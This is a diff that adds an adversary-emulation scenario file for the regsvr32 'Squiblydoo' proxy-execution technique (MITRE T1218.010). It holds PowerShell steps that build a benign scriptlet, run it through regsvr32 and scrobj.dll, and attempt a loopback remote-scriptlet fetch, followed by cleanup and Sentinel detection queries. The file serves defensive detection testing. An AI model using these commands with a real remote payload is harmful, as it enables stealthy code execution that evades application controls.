@@ -1,0 +1,102 @@
+id: T1218.010_regsvr32
+name: "System Binary Proxy Execution — Regsvr32"
+mitre_technique: "T1218.010"
+mitre_tactic: "defense_evasion"
+description: >
+  regsvr32.exe can register/unregister DLLs and OLE controls, but adversaries abuse it
+  to execute arbitrary scripts via the /i: flag with scrobj.dll — loading a COM scriptlet
+  (.sct) from a remote URL or local path. This is the "Squiblydoo" technique. regsvr32
+  can also bypass AppLocker and runs from a signed Windows binary.
+  This scenario exercises both local scriptlet execution and the remote SCT URL pattern.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/010/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.010 — regsvr32 Squiblydoo proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a benign COM scriptlet (.sct) file"
+    command: |
+      $sctPath = "$env:TEMP\PAS_T1218_010.sct"
+      $outFile = "$env:TEMP\PAS_T1218_010_fired.txt"
+      Set-Content $sctPath @"
+<?XML version="1.0"?>
+<scriptlet>
+<registration description="PAS" progid="PAS.T1218" version="1.00"
+              classid="{AAAAAAAA-0000-0000-0000-000000000001}">
+  <script language="VBScript">
+    <![CDATA[
+      Set oSh = CreateObject("WScript.Shell")
+      oSh.Run "cmd.exe /c echo PAS-T1218.010-SQUIBLYDOO > $outFile", 0, True
+    ]]>
+  </script>
+</registration>
+</scriptlet>
+"@
+      Write-Host "[PAS] COM scriptlet created: $sctPath"
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute via regsvr32 /s /u /i:sct scrobj.dll — Squiblydoo"
+    command: |
+      $sctPath = "$env:TEMP\PAS_T1218_010.sct"
+      Write-Host "[PAS] Executing Squiblydoo: regsvr32.exe /s /u /i:$sctPath scrobj.dll"
+      Start-Process regsvr32.exe `
+          -ArgumentList "/s /u /i:$sctPath scrobj.dll" -NoNewWindow -Wait
+      if (Test-Path "$env:TEMP\PAS_T1218_010_fired.txt") {
+          Write-Host "[PAS] Squiblydoo EXECUTED — scriptlet ran via regsvr32.exe"
+      } else {
+          Write-Host "[PAS] Scriptlet did not fire (expected on hardened systems)"
+      }
+
+  - step: 4
+    type: exec_powershell
+    description: "Pattern 2: regsvr32 with remote SCT URL (loopback — no external traffic)"
+    command: |
+      Write-Host "[PAS] Remote SCT URL pattern (telemetry only — loopback):"
+      Write-Host "[PAS] Command: regsvr32.exe /s /u /i:http://127.0.0.1/payload.sct scrobj.dll"
+      Start-Process regsvr32.exe `
+          -ArgumentList "/s /u /i:http://127.0.0.1/PAS_T1218_010.sct scrobj.dll" `
+          -NoNewWindow -Wait -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Network fetch attempt generated (expected failure — loopback)"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — regsvr32.exe with scrobj.dll and /i: flag; network event for URL variant"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove SCT and output files"
+    command: |
+      @("$env:TEMP\PAS_T1218_010.sct",
+        "$env:TEMP\PAS_T1218_010_fired.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS][Cleanup] SCT files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1218.010 cleanup complete"
+
+analyst_checklist:
+  - "Process event: regsvr32.exe with 'scrobj.dll' and '/i:' arguments — Squiblydoo signature"
+  - "Network event: regsvr32.exe making HTTP connection — remote SCT fetch"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'regsvr32.exe' and ProcessCommandLine contains 'scrobj'"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'regsvr32.exe'"
+  - "MDE alert: 'Regsvr32 Squiblydoo execution' or 'COM scriptlet via regsvr32'"
+  - "CONTROL CHECK: regsvr32.exe with scrobj.dll is one of the most documented LOLBin techniques — should be covered by ASR rules"
+  - "CONTROL CHECK: ASR rule 'Block execution of potentially obfuscated scripts' should catch this pattern"
